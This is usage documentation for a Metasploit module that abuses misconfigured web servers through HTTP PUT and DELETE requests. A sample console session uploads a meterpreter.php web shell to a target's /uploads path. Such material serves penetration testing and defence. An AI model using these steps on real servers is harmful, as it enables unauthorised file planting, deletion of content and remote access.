## Description 
This module can abuse misconfigured web servers to upload and delete web content via PUT and DELETE HTTP requests.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/http_put```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```set PATH [PATH]```
5. Do: ```set FILENAME [FILNAME]```
6. Do: ```set FILEDATA [PATH]```
7. DO: ```run```

## Options 

### ACTION

**PUT**

Action is set to PUT to upload files to the server. If `FILENAME` isn't specified, the module will generate a random string as a .txt file.

**DELETE** 

`FILENAME` is required when Action is set to DELETE 

### PATH

The path at which this module will attempt to either PUT the content or DELETE it.

## Scenarios

Here Action is set to `PUT`.

```
msf > use auxiliary/scanner/http/http_put
msf auxiliary(scanner/http/http_put) > set ACTION PUT
ACTION => PUT
msf auxiliary(scanner/http/http_put) > set RHOSTS 1.1.1.23
RHOSTS => 1.1.1.23
msf auxiliary(scanner/http/http_put) > set RPORT 8585
RPORT => 8585
msf auxiliary(scanner/http/http_put) > set PATH /uploads
PATH => /uploads
msf auxiliary(scanner/http/http_put) > set FILENAME meterpreter.php
FILENAME => meterpreter.php
msf auxiliary(scanner/http/http_put) > set FILEDATA file://root/Desktop/meterpreter.php
FILEDATA => file://root/Desktop/meterpreter.php
msf auxiliary(scanner/http/http_put) > run 

[+] File uploaded: http://1.1.1.23:8585/uploads/meterpreter.php
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/http_put) >
```
 
